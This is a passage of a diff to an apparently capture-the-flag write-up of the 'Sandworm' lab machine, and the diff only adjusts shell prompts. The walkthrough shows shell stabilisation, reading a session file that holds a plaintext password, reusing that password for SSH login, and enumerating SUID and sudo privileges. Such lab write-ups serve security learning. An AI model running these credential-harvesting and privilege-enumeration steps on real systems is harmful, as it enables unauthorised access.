 <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">local</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">lesspipe</span><span class="p">:</span> <span class="mi">1</span><span class="p">:</span> <span class="n">dirname</span><span class="p">:</span> <span class="ow">not</span> <span class="n">found</span>
-<span class="nd">@atlas@sandworm</span><span class="p">:</span><span class="o">~</span><span class="err">$</span>
+<span class="nd">atlas@sandworm</span><span class="p">:</span><span class="o">~</span><span class="err">$</span>
 </pre></div>
 
 Now, press <code>Ctrl+Z</code> to background the current shell process, and then run the following commands:<br/><br/>
-<div class="highlight"><pre><span></span><span class="nd">@elswix@kali</span><span class="err">$</span> <span class="n">stty</span> <span class="n">raw</span> <span class="o">-</span><span class="n">echo</span><span class="p">;</span><span class="n">fg</span>
-<span class="nd">@atlas@sandworm</span><span class="p">:</span><span class="o">~</span><span class="err">$</span> <span class="n">export</span> <span class="n">TERM</span><span class="o">=</span><span class="n">xterm</span>
+<div class="highlight"><pre><span></span><span class="nd">elswix@kali</span><span class="err">$</span> <span class="n">stty</span> <span class="n">raw</span> <span class="o">-</span><span class="n">echo</span><span class="p">;</span><span class="n">fg</span>
+<span class="nd">atlas@sandworm</span><span class="p">:</span><span class="o">~</span><span class="err">$</span> <span class="n">export</span> <span class="n">TERM</span><span class="o">=</span><span class="n">xterm</span>
 </pre></div>
 
 Listing the contents of the <code>/home</code> directory, we observe that there are two users:<br/><br/>
-<div class="highlight"><pre><span></span><span class="nd">@atlas@sandworm</span><span class="p">:</span><span class="o">~</span><span class="err">$</span> <span class="n">ls</span> <span class="o">-</span><span class="n">l</span> <span class="o">/</span><span class="n">home</span>
+<div class="highlight"><pre><span></span><span class="nd">atlas@sandworm</span><span class="p">:</span><span class="o">~</span><span class="err">$</span> <span class="n">ls</span> <span class="o">-</span><span class="n">l</span> <span class="o">/</span><span class="n">home</span>
 <span class="n">total</span> <span class="mi">4</span>
 <span class="n">drwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span> <span class="mi">8</span> <span class="n">atlas</span>  <span class="n">atlas</span>   <span class="mi">4096</span> <span class="n">Nov</span> <span class="mi">18</span> <span class="mi">16</span><span class="p">:</span><span class="mi">01</span> <span class="n">atlas</span>
 <span class="n">dr</span><span class="o">--------</span> <span class="mi">2</span> <span class="n">nobody</span> <span class="n">nogroup</span>   <span class="mi">40</span> <span class="n">Nov</span> <span class="mi">18</span> <span class="mi">11</span><span class="p">:</span><span class="mi">06</span> <span class="n">silentobserver</span>
-<span class="nd">@atlas@sandworm</span><span class="p">:</span><span class="o">~</span><span class="err">$</span>
+<span class="nd">atlas@sandworm</span><span class="p">:</span><span class="o">~</span><span class="err">$</span>
 </pre></div>
 
 In Atlas's home directory, the following files are present:<br/><br/>
-<div class="highlight"><pre><span></span><span class="nd">@atlas@sandworm</span><span class="p">:</span><span class="o">~</span><span class="err">$</span> <span class="n">ls</span> <span class="o">-</span><span class="n">la</span>
+<div class="highlight"><pre><span></span><span class="nd">atlas@sandworm</span><span class="p">:</span><span class="o">~</span><span class="err">$</span> <span class="n">ls</span> <span class="o">-</span><span class="n">la</span>
 <span class="n">total</span> <span class="mi">48</span>
 <span class="n">drwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span> <span class="mi">8</span> <span class="n">atlas</span>  <span class="n">atlas</span>   <span class="mi">4096</span> <span class="n">Nov</span> <span class="mi">18</span> <span class="mi">16</span><span class="p">:</span><span class="mi">01</span> <span class="o">.</span>
 <span class="n">drwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span> <span class="mi">4</span> <span class="n">nobody</span> <span class="n">nogroup</span> <span class="mi">4096</span> <span class="n">May</span>  <span class="mi">4</span>  <span class="mi">2023</span> <span class="o">..</span>
@@ -462,32 +462,32 @@ In Atlas's home directory, the following files are present:<br/><br/>
 <span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--</span><span class="n">r</span><span class="o">--</span> <span class="mi">1</span> <span class="n">atlas</span>  <span class="n">atlas</span>    <span class="mi">807</span> <span class="n">Nov</span> <span class="mi">22</span>  <span class="mi">2022</span> <span class="o">.</span><span class="n">profile</span>
 <span class="n">drwx</span><span class="o">------</span> <span class="mi">2</span> <span class="n">atlas</span>  <span class="n">atlas</span>   <span class="mi">4096</span> <span class="n">Nov</span> <span class="mi">18</span> <span class="mi">16</span><span class="p">:</span><span class="mi">06</span> <span class="o">.</span><span class="n">ssh</span>
 <span class="o">-</span><span class="n">rw</span><span class="o">-------</span> <span class="mi">1</span> <span class="n">atlas</span>  <span class="n">atlas</span>    <span class="mi">868</span> <span class="n">Nov</span> <span class="mi">18</span> <span class="mi">16</span><span class="p">:</span><span class="mi">01</span> <span class="o">.</span><span class="n">viminfo</span>
-<span class="nd">@atlas@sandworm</span><span class="p">:</span><span class="o">~</span><span class="err">$</span>
+<span class="nd">atlas@sandworm</span><span class="p">:</span><span class="o">~</span><span class="err">$</span>
 </pre></div>
 
 Within the <code>.config</code> directory, the following content is observed:<br/><br/>
-<div class="highlight"><pre><span></span><span class="nd">@atlas@sandworm</span><span class="p">:</span><span class="o">~</span><span class="err">$</span> <span class="n">cd</span> <span class="o">.</span><span class="n">config</span>
-<span class="nd">@atlas@sandworm</span><span class="p">:</span><span class="o">~/.</span><span class="n">config</span><span class="err">$</span> <span class="n">ls</span> <span class="o">-</span><span class="n">la</span>
+<div class="highlight"><pre><span></span><span class="nd">atlas@sandworm</span><span class="p">:</span><span class="o">~</span><span class="err">$</span> <span class="n">cd</span> <span class="o">.</span><span class="n">config</span>
+<span class="nd">atlas@sandworm</span><span class="p">:</span><span class="o">~/.</span><span class="n">config</span><span class="err">$</span> <span class="n">ls</span> <span class="o">-</span><span class="n">la</span>
 <span class="n">total</span> <span class="mi">12</span>
 <span class="n">drwxrwxr</span><span class="o">-</span><span class="n">x</span> <span class="mi">4</span> <span class="n">atlas</span>  <span class="n">atlas</span>   <span class="mi">4096</span> <span class="n">Jan</span> <span class="mi">15</span>  <span class="mi">2023</span> <span class="o">.</span>
 <span class="n">drwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span> <span class="mi">8</span> <span class="n">atlas</span>  <span class="n">atlas</span>   <span class="mi">4096</span> <span class="n">Nov</span> <span class="mi">18</span> <span class="mi">16</span><span class="p">:</span><span class="mi">01</span> <span class="o">..</span>
 <span class="n">dr</span><span class="o">--------</span> <span class="mi">2</span> <span class="n">nobody</span> <span class="n">nogroup</span>   <span class="mi">40</span> <span class="n">Nov</span> <span class="mi">18</span> <span class="mi">11</span><span class="p">:</span><span class="mi">06</span> <span class="n">firejail</span>
 <span class="n">drwxrwxr</span><span class="o">-</span><span class="n">x</span> <span class="mi">3</span> <span class="n">nobody</span> <span class="n">atlas</span>   <span class="mi">4096</span> <span class="n">Jan</span> <span class="mi">15</span>  <span class="mi">2023</span> <span class="n">httpie</span>
-<span class="nd">@atlas@sandworm</span><span class="p">:</span><span class="o">~/.</span><span class="n">config</span><span class="err">$</span>
+<span class="nd">atlas@sandworm</span><span class="p">:</span><span class="o">~/.</span><span class="n">config</span><span class="err">$</span>
 </pre></div>
 
 It appears that our container operates within a firejail sandbox.<br/><br/>
 Upon investigating the <code>httpie</code> directory, I discovered the following file:<br/><br/>
-<div class="highlight"><pre><span></span><span class="nd">@atlas@sandworm</span><span class="p">:</span><span class="o">~/.</span><span class="n">config</span><span class="err">$</span> <span class="n">cd</span> <span class="n">httpie</span><span class="o">/</span><span class="n">sessions</span><span class="o">/</span><span class="n">localhost_5000</span><span class="o">/</span>
+<div class="highlight"><pre><span></span><span class="nd">atlas@sandworm</span><span class="p">:</span><span class="o">~/.</span><span class="n">config</span><span class="err">$</span> <span class="n">cd</span> <span class="n">httpie</span><span class="o">/</span><span class="n">sessions</span><span class="o">/</span><span class="n">localhost_5000</span><span class="o">/</span>
 <span class="n">admin</span><span class="o">.</span><span class="n">json</span>
-<span class="nd">@atlas@sandworm</span><span class="p">:</span><span class="o">~/.</span><span class="n">config</span><span class="o">/</span><span class="n">httpie</span><span class="o">/</span><span class="n">sessions</span><span class="o">/</span><span class="n">localhost_5000</span><span class="err">$</span> <span class="n">ls</span> <span class="o">-</span><span class="n">l</span>
+<span class="nd">atlas@sandworm</span><span class="p">:</span><span class="o">~/.</span><span class="n">config</span><span class="o">/</span><span class="n">httpie</span><span class="o">/</span><span class="n">sessions</span><span class="o">/</span><span class="n">localhost_5000</span><span class="err">$</span> <span class="n">ls</span> <span class="o">-</span><span class="n">l</span>
 <span class="n">total</span> <span class="mi">4</span>
 <span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--</span><span class="n">r</span><span class="o">--</span> <span class="mi">1</span> <span class="n">nobody</span> <span class="n">atlas</span> <span class="mi">611</span> <span class="n">May</span>  <span class="mi">4</span>  <span class="mi">2023</span> <span class="n">admin</span><span class="o">.</span><span class="n">json</span>
-<span class="nd">@atlas@sandworm</span><span class="p">:</span><span class="o">~/.</span><span class="n">config</span><span class="o">/</span><span class="n">httpie</span><span class="o">/</span><span class="n">sessions</span><span class="o">/</span><span class="n">localhost_5000</span><span class="err">$</span>
+<span class="nd">atlas@sandworm</span><span class="p">:</span><span class="o">~/.</span><span class="n">config</span><span class="o">/</span><span class="n">httpie</span><span class="o">/</span><span class="n">sessions</span><span class="o">/</span><span class="n">localhost_5000</span><span class="err">$</span>
 </pre></div>
 
 Upon listing the contents, we acquire credentials for the user <code>silentobserver</code>:<br/><br/>
-<div class="highlight"><pre><span></span><span class="nd">@atlas@sandworm</span><span class="p">:</span><span class="o">~/.</span><span class="n">config</span><span class="o">/</span><span class="n">httpie</span><span class="o">/</span><span class="n">sessions</span><span class="o">/</span><span class="n">localhost_5000</span><span class="err">$</span> <span class="n">cat</span> <span class="n">admin</span><span class="o">.</span><span class="n">json</span> 
+<div class="highlight"><pre><span></span><span class="nd">atlas@sandworm</span><span class="p">:</span><span class="o">~/.</span><span class="n">config</span><span class="o">/</span><span class="n">httpie</span><span class="o">/</span><span class="n">sessions</span><span class="o">/</span><span class="n">localhost_5000</span><span class="err">$</span> <span class="n">cat</span> <span class="n">admin</span><span class="o">.</span><span class="n">json</span> 
 <span class="p">{</span>
     <span class="s2">"__meta__"</span><span class="p">:</span> <span class="p">{</span>
         <span class="s2">"about"</span><span class="p">:</span> <span class="s2">"HTTPie session file"</span><span class="p">,</span>
@@ -511,11 +511,11 @@ Upon listing the contents, we acquire credentials for the user <code>silentobser
         <span class="s2">"Accept"</span><span class="p">:</span> <span class="s2">"application/json, */*;q=0.5"</span>
     <span class="p">}</span>
 <span class="p">}</span>
-<span class="nd">@atlas@sandworm</span><span class="p">:</span><span class="o">~/.</span><span class="n">config</span><span class="o">/</span><span class="n">httpie</span><span class="o">/</span><span class="n">sessions</span><span class="o">/</span><span class="n">localhost_5000</span><span class="err">$</span>
+<span class="nd">atlas@sandworm</span><span class="p">:</span><span class="o">~/.</span><span class="n">config</span><span class="o">/</span><span class="n">httpie</span><span class="o">/</span><span class="n">sessions</span><span class="o">/</span><span class="n">localhost_5000</span><span class="err">$</span>
 </pre></div>
 
 Let's try to establish a shell as <code>silentobserver</code> using these credentials through the SSH service:<br/><br/>
-<div class="highlight"><pre><span></span><span class="nd">@elswix@kali</span><span class="err">$</span> <span class="n">sshpass</span> <span class="o">-</span><span class="n">p</span> <span class="s1">'quietLiketheWind22'</span> <span class="n">ssh</span> <span class="n">silentobserver</span><span class="o">@</span><span class="mf">10.10.11.218</span>
+<div class="highlight"><pre><span></span><span class="nd">elswix@kali</span><span class="err">$</span> <span class="n">sshpass</span> <span class="o">-</span><span class="n">p</span> <span class="s1">'quietLiketheWind22'</span> <span class="n">ssh</span> <span class="n">silentobserver</span><span class="o">@</span><span class="mf">10.10.11.218</span>
 <span class="n">Welcome</span> <span class="n">to</span> <span class="n">Ubuntu</span> <span class="mf">22.04.2</span> <span class="n">LTS</span> <span class="p">(</span><span class="n">GNU</span><span class="o">/</span><span class="n">Linux</span> <span class="mf">5.15.0</span><span class="o">-</span><span class="mi">73</span><span class="o">-</span><span class="n">generic</span> <span class="n">x86_64</span><span class="p">)</span>
 
  <span class="o">*</span> <span class="n">Documentation</span><span class="p">:</span>  <span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">help</span><span class="o">.</span><span class="n">ubuntu</span><span class="o">.</span><span class="n">com</span>
@@ -548,33 +548,33 @@ Let's try to establish a shell as <code>silentobserver</code> using these creden
 
 
 <span class="n">Last</span> <span class="n">login</span><span class="p">:</span> <span class="n">Sat</span> <span class="n">Nov</span> <span class="mi">18</span> <span class="mi">16</span><span class="p">:</span><span class="mi">04</span><span class="p">:</span><span class="mi">32</span> <span class="mi">2023</span> <span class="kn">from</span> <span class="mf">10.10.16.7</span>
-<span class="nd">@silentobserver@sandworm</span><span class="p">:</span><span class="o">~</span><span class="err">$</span>
+<span class="nd">silentobserver@sandworm</span><span class="p">:</span><span class="o">~</span><span class="err">$</span>
 </pre></div>
 
 We have successfully gained access to Sandworm as the user <code>silentobserver</code>.<br/><br/>
 <h3><br>Shell as atlas</br></h3><br>
 It appears that <code>silentobserver</code> does not belong to any specific groups:<br/><br/>
-<div class="highlight"><pre><span></span><span class="nd">@silentobserver@sandworm</span><span class="p">:</span><span class="o">~</span><span class="err">$</span> <span class="nb">id</span>
+<div class="highlight"><pre><span></span><span class="nd">silentobserver@sandworm</span><span class="p">:</span><span class="o">~</span><span class="err">$</span> <span class="nb">id</span>
 <span class="n">uid</span><span class="o">=</span><span class="mi">1001</span><span class="p">(</span><span class="n">silentobserver</span><span class="p">)</span> <span class="n">gid</span><span class="o">=</span><span class="mi">1001</span><span class="p">(</span><span class="n">silentobserver</span><span class="p">)</span> <span class="n">groups</span><span class="o">=</span><span class="mi">1001</span><span class="p">(</span><span class="n">silentobserver</span><span class="p">)</span>
 </pre></div>
 
 Upon inspecting the sudo privileges of <code>silentobserver</code>, it is evident that the user does not have the ability to execute any command with sudo privileges:<br/><br/>
-<div class="highlight"><pre><span></span><span class="nd">@silentobserver@sandworm</span><span class="p">:</span><span class="o">~</span><span class="err">$</span> <span class="n">sudo</span> <span class="o">-</span><span class="n">l</span>
+<div class="highlight"><pre><span></span><span class="nd">silentobserver@sandworm</span><span class="p">:</span><span class="o">~</span><span class="err">$</span> <span class="n">sudo</span> <span class="o">-</span><span class="n">l</span>
 <span class="p">[</span><span class="n">sudo</span><span class="p">]</span> <span class="n">password</span> <span class="k">for</span> <span class="n">silentobserver</span><span class="p">:</span> 
 <span class="n">Sorry</span><span class="p">,</span> <span class="n">user</span> <span class="n">silentobserver</span> <span class="n">may</span> <span class="ow">not</span> <span class="n">run</span> <span class="n">sudo</span> <span class="n">on</span> <span class="n">localhost</span><span class="o">.</span>
-<span class="nd">@silentobserver@sandworm</span><span class="p">:</span><span class="o">~</span><span class="err">$</span>
+<span class="nd">silentobserver@sandworm</span><span class="p">:</span><span class="o">~</span><span class="err">$</span>
 </pre></div>
 
 No notable capabilities are identified:<br/><br/>
-<div class="highlight"><pre><span></span><span class="nd">@silentobserver@sandworm</span><span class="p">:</span><span class="o">~</span><span class="err">$</span> <span class="n">getcap</span> <span class="o">-</span><span class="n">r</span> <span class="o">/</span> <span class="mi">2</span><span class="o">&gt;/</span><span class="n">dev</span><span class="o">/</span><span class="n">null</span>
+<div class="highlight"><pre><span></span><span class="nd">silentobserver@sandworm</span><span class="p">:</span><span class="o">~</span><span class="err">$</span> <span class="n">getcap</span> <span class="o">-</span><span class="n">r</span> <span class="o">/</span> <span class="mi">2</span><span class="o">&gt;/</span><span class="n">dev</span><span class="o">/</span><span class="n">null</span>
 <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">x86_64</span><span class="o">-</span><span class="n">linux</span><span class="o">-</span><span class="n">gnu</span><span class="o">/</span><span class="n">gstreamer1</span><span class="mf">.0</span><span class="o">/</span><span class="n">gstreamer</span><span class="o">-</span><span class="mf">1.0</span><span class="o">/</span><span class="n">gst</span><span class="o">-</span><span class="n">ptp</span><span class="o">-</span><span class="n">helper</span> <span class="n">cap_net_bind_service</span><span class="p">,</span><span class="n">cap_net_admin</span><span class="o">=</span><span class="n">ep</span>
 <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">ping</span> <span class="n">cap_net_raw</span><span class="o">=</span><span class="n">ep</span>
 <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">mtr</span><span class="o">-</span><span class="n">packet</span> <span class="n">cap_net_raw</span><span class="o">=</span><span class="n">ep</span>
-<span class="nd">@silentobserver@sandworm</span><span class="p">:</span><span class="o">~</span><span class="err">$</span>
+<span class="nd">silentobserver@sandworm</span><span class="p">:</span><span class="o">~</span><span class="err">$</span>
 </pre></div>
 
 When listing Set-UID files on the system, the following files were identified:<br/><br/>
-<div class="highlight"><pre><span></span><span class="nd">@silentobserver@sandworm</span><span class="p">:</span><span class="o">~</span><span class="err">$</span> <span class="n">find</span> <span class="o">/</span> <span class="o">-</span><span class="n">perm</span> <span class="o">-</span><span class="mi">4000</span> <span class="mi">2</span><span class="o">&gt;/</span><span class="n">dev</span><span class="o">/</span><span class="n">null</span>
+<div class="highlight"><pre><span></span><span class="nd">silentobserver@sandworm</span><span class="p">:</span><span class="o">~</span><span class="err">$</span> <span class="n">find</span> <span class="o">/</span> <span class="o">-</span><span class="n">perm</span> <span class="o">-</span><span class="mi">4000</span> <span class="mi">2</span><span class="o">&gt;/</span><span class="n">dev</span><span class="o">/</span><span class="n">null</span>
 <span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">tipnet</span><span class="o">/</span><span class="n">target</span><span class="o">/</span><span class="n">debug</span><span class="o">/</span><span class="n">tipnet</span>
 <span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">tipnet</span><span class="o">/</span><span class="n">target</span><span class="o">/</span><span class="n">debug</span><span class="o">/</span><span class="n">deps</span><span class="o">/</span><span class="n">tipnet</span><span class="o">-</span><span class="n">a859bd054535b3c1</span>
 <span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">tipnet</span><span class="o">/</span><span class="n">target</span><span class="o">/</span><span class="n">debug</span><span class="o">/</span><span class="n">deps</span><span class="o">/</span><span class="n">tipnet</span><span class="o">-</span><span class="n">dabc93f7704f7b48</span>
@@ -592,30 +592,30 @@ When listing Set-UID files on the system, the following files were identified:<b
 <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">newgrp</span>
 <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">su</span>
 <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">fusermount3</span>
-<span class="nd">@silentobserver@sandworm</span><span class="p">:</span><span class="o">~</span><span class="err">$</span>
+<span class="nd">silentobserver@sandworm</span><span class="p">:</span><span class="o">~</span><span class="err">$</span>
 </pre></div>
 
 Here, we encounter interesting elements. Initially, let's attempt to execute <code>firejail</code>:<br/><br/>
-<div class="highlight"><pre><span></span><span class="nd">@silentobserver@sandworm</span><span class="p">:</span><span class="o">~</span><span class="err">$</span> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">local</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">firejail</span>
+<div class="highlight"><pre><span></span><span class="nd">silentobserver@sandworm</span><span class="p">:</span><span class="o">~</span><span class="err">$</span> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">local</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">firejail</span>
 <span class="o">-</span><span class="n">bash</span><span class="p">:</span> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">local</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">firejail</span><span class="p">:</span> <span class="n">Permission</span> <span class="n">denied</span>
-<span class="nd">@silentobserver@sandworm</span><span class="p">:</span><span class="o">~</span><span class="err">$</span>
+<span class="nd">silentobserver@sandworm</span><span class="p">:</span><span class="o">~</span><span class="err">$</span>
 </pre></div>
 
 It returns a <code>Permission Denied</code> error. Upon inspecting its privileges, it becomes apparent that membership in the <code>Jailer</code> group is required to execute this binary:<br/><br/>
-<div class="highlight"><pre><span></span><span class="nd">@silentobserver@sandworm</span><span class="p">:</span><span class="o">~</span><span class="err">$</span> <span class="n">ls</span> <span class="o">-</span><span class="n">l</span> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">local</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">firejail</span>
+<div class="highlight"><pre><span></span><span class="nd">silentobserver@sandworm</span><span class="p">:</span><span class="o">~</span><span class="err">$</span> <span class="n">ls</span> <span class="o">-</span><span class="n">l</span> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">local</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">firejail</span>
 <span class="o">-</span><span class="n">rwsr</span><span class="o">-</span><span class="n">x</span><span class="o">---</span> <span class="mi">1</span> <span class="n">root</span> <span class="n">jailer</span> <span class="mi">1777952</span> <span class="n">Nov</span> <span class="mi">29</span>  <span class="mi">2022</span> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">local</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">firejail</span>
-<span class="nd">@silentobserver@sandworm</span><span class="p">:</span><span class="o">~</span><span class="err">$</span>
+<span class="nd">silentobserver@sandworm</span><span class="p">:</span><span class="o">~</span><span class="err">$</span>
 </pre></div>
 
 Another intriguing Set-UID file is present, named <code>tipnet</code>, and it appears to be a compiled binary:<br/><br/>
-<div class="highlight"><pre><span></span><span class="nd">@silentobserver@sandworm</span><span class="p">:</span><span class="o">~</span><span class="err">$</span> <span class="n">ls</span> <span class="o">-</span><span class="n">l</span> <span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">tipnet</span><span class="o">/</span><span class="n">target</span><span class="o">/</span><span class="n">debug</span><span class="o">/</span><span class="n">tipnet</span>
+<div class="highlight"><pre><span></span><span class="nd">silentobserver@sandworm</span><span class="p">:</span><span class="o">~</span><span class="err">$</span> <span class="n">ls</span> <span class="o">-</span><span class="n">l</span> <span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">tipnet</span><span class="o">/</span><span class="n">target</span><span class="o">/</span><span class="n">debug</span><span class="o">/</span><span class="n">tipnet</span>
 <span class="o">-</span><span class="n">rwsrwxr</span><span class="o">-</span><span class="n">x</span> <span class="mi">2</span> <span class="n">atlas</span> <span class="n">atlas</span> <span class="mi">59087648</span> <span class="n">Nov</span> <span class="mi">18</span> <span class="mi">16</span><span class="p">:</span><span class="mi">04</span> <span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">tipnet</span><span class="o">/</span><span class="n">target</span><span class="o">/</span><span class="n">debug</span><span class="o">/</span><span class="n">tipnet</span>
-<span class="nd">@silentobserver@sandworm</span><span class="p">:</span><span class="o">~</span><span class="err">$</span> <span class="n">file</span> <span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">tipnet</span><span class="o">/</span><span class="n">target</span><span class="o">/</span><span class="n">debug</span><span class="o">/</span><span class="n">tipnet</span>
+<span class="nd">silentobserver@sandworm</span><span class="p">:</span><span class="o">~</span><span class="err">$</span> <span class="n">file</span> <span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">tipnet</span><span class="o">/</span><span class="n">target</span><span class="o">/</span><span class="n">debug</span><span class="o">/</span><span class="n">tipnet</span>
 <span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">tipnet</span><span class="o">/</span><span class="n">target</span><span class="o">/</span><span class="n">debug</span><span class="o">/</span><span class="n">tipnet</span><span class="p">:</span> <span class="n">setuid</span> <span class="n">ELF</span> <span class="mi">64</span><span class="o">-</span><span class="n">bit</span> <span class="n">LSB</span> <span class="n">pie</span> <span class="n">executable</span><span class="p">,</span> <span class="n">x86</span><span class="o">-</span><span class="mi">64</span><span class="p">,</span> <span class="n">version</span> <span class="mi">1</span> <span class="p">(</span><span class="n">SYSV</span><span class="p">),</span> <span class="n">dynamically</span> <span class="n">linked</span><span class="p">,</span> <span class="n">interpreter</span> <span class="o">/</span><span class="n">lib64</span><span class="o">/</span><span class="n">ld</span><span class="o">-</span><span class="n">linux</span><span class="o">-</span><span class="n">x86</span><span class="o">-</span><span class="mf">64.</span><span class="n">so</span><span class="mf">.2</span><span class="p">,</span> <span class="n">BuildID</span><span class="p">[</span><span class="n">sha1</span><span class="p">]</span><span class="o">=</span><span class="mi">7</span><span class="n">a6eafbd277ceb248bd47f806f7677f57fb9d7dd</span><span class="p">,</span> <span class="k">for</span> <span class="n">GNU</span><span class="o">/</span><span class="n">Linux</span> <span class="mf">3.2.0</span><span class="p">,</span> <span class="k">with</span> <span class="n">debug_info</span><span class="p">,</span> <span class="ow">not</span> <span class="n">stripped</span>
 </pre></div>
 
 Let's execute <code>tipnet</code>:<br/><br/>
-<div class="highlight"><pre><span></span><span class="nd">@silentobserver@sandworm</span><span class="p">:</span><span class="o">~</span><span class="err">$</span> <span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">tipnet</span><span class="o">/</span><span class="n">target</span><span class="o">/</span><span class="n">debug</span><span class="o">/</span><span class="n">tipnet</span>
+<div class="highlight"><pre><span></span><span class="nd">silentobserver@sandworm</span><span class="p">:</span><span class="o">~</span><span class="err">$</span> <span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">tipnet</span><span class="o">/</span><span class="n">target</span><span class="o">/</span><span class="n">debug</span><span class="o">/</span><span class="n">tipnet</span>
 
              <span class="p">,,</span>                                      
 <span class="n">MMP</span><span class="s2">""</span><span class="n">MM</span><span class="s2">""</span><span class="n">YMM</span> <span class="n">db</span>          <span class="err">`</span><span class="mi">7</span><span class="n">MN</span><span class="o">.</span>   <span class="err">`</span><span class="mi">7</span><span class="n">MF</span><span class="s1">'         mm    </span>
@@ -664,11 +664,11 @@ There are five options, with only options 'a' and 'e' functioning. Let's select 
 <span class="n">Justification</span> <span class="k">for</span> <span class="n">the</span> <span class="n">search</span><span class="p">:</span>
 <span class="n">test</span>
 <span class="p">[</span><span class="mi">2022</span><span class="o">-</span><span class="mi">03</span><span class="o">-</span><span class="mi">22</span> <span class="mi">22</span><span class="p">:</span><span class="mi">06</span><span class="p">:</span><span class="mi">13</span><span class="p">]</span> <span class="mf">104.121.74.33</span> <span class="o">===&gt;</span> <span class="mf">201.34.89.21</span> <span class="o">|</span> <span class="n">Did</span> <span class="n">you</span> <span class="n">see</span> <span class="n">the</span> <span class="n">latest</span> <span class="n">episode</span> <span class="n">of</span> <span class="n">Game</span> <span class="n">of</span> <span class="n">Thrones</span><span class="err">?</span> <span class="n">It</span> <span class="n">was</span> <span class="n">so</span> <span class="n">good</span><span class="err">!</span>
-<span class="nd">@silentobserver@sandworm</span><span class="p">:</span><span class="o">~</span><span class="err">$</span>
+<span class="nd">silentobserver@sandworm</span><span class="p">:</span><span class="o">~</span><span class="err">$</span>
 </pre></div>
 
 There doesn't seem to be anything noteworthy in the output. To gain a better understanding of how it works, let's examine its directories:<br/><br/>
-<div class="highlight"><pre><span></span><span class="nd">@silentobserver@sandworm</span><span class="p">:</span><span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">tipnet</span><span class="err">$</span> <span class="n">ls</span> <span class="o">-</span><span class="n">la</span>
+<div class="highlight"><pre><span></span><span class="nd">silentobserver@sandworm</span><span class="p">:</span><span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">tipnet</span><span class="err">$</span> <span class="n">ls</span> <span class="o">-</span><span class="n">la</span>
 <span class="n">total</span> <span class="mi">136</span>
 <span class="n">drwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span> <span class="mi">5</span> <span class="n">root</span>  <span class="n">atlas</span>  <span class="mi">4096</span> <span class="n">Jun</span>  <span class="mi">6</span> <span class="mi">11</span><span class="p">:</span><span class="mi">49</span> <span class="o">.</span>
 <span class="n">drwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span> <span class="mi">4</span> <span class="n">root</span>  <span class="n">root</span>   <span class="mi">4096</span> <span class="n">Nov</span> <span class="mi">18</span> <span class="mi">21</span><span class="p">:</span><span class="mi">28</span> <span class="o">..</span>
@@ -679,30 +679,30 @@ There doesn't seem to be anything noteworthy in the output. To gain a better und
 <span class="o">-</span><span class="n">rwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">--</span> <span class="mi">1</span> <span class="n">root</span>  <span class="n">atlas</span>     <span class="mi">8</span> <span class="n">Feb</span>  <span class="mi">8</span>  <span class="mi">2023</span> <span class="o">.</span><span class="n">gitignore</span>
 <span class="n">drwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span> <span class="mi">2</span> <span class="n">root</span>  <span class="n">atlas</span>  <span class="mi">4096</span> <span class="n">Jun</span>  <span class="mi">6</span> <span class="mi">11</span><span class="p">:</span><span class="mi">49</span> <span class="n">src</span>
 <span class="n">drwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span> <span class="mi">3</span> <span class="n">root</span>  <span class="n">atlas</span>  <span class="mi">4096</span> <span class="n">Jun</span>  <span class="mi">6</span> <span class="mi">11</span><span class="p">:</span><span class="mi">49</span> <span class="n">target</span>
